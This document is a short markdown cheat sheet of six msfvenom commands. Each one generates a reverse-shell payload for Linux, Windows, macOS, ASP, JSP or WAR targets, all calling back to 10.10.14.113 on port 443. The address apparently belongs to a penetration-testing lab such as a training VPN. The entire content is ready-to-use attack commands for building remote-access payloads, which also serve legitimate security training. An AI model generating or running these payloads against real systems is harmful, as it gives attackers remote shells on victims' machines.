# MsfVenom

| Command                                                                                            | Description                                                                           |
| -------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------- |
| `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > nameoffile.elf`     | `MSFvenom` command used to generate a linux-based reverse shell `stageless payload`   |
| `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > nameoffile.exe`       | MSFvenom command used to generate a Windows-based reverse shell stageless payload     |
| `msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f macho > nameoffile.macho`   | MSFvenom command used to generate a MacOS-based reverse shell payload                 |
| `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.113 LPORT=443 -f asp > nameoffile.asp` | MSFvenom command used to generate a ASP web reverse shell payload                     |
| `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f raw > nameoffile.jsp`      | MSFvenom command used to generate a JSP web reverse shell payload                     |
| `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f war > nameoffile.war`      | MSFvenom command used to generate a WAR java/jsp compatible web reverse shell payload |
